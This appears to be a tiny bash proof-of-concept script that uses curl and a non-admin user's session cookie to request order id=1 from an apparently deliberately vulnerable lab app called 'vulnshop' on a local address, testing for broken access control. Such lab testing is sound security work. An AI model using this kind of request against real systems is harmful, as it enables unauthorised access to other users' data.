#!/bin/bash

# Requires a logged-in non-admin cookie file (e.g., /tmp/vulnshop.cookie)
curl -i -b /tmp/vulnshop.cookie "http://192.168.0.28:3000/order?id=1"
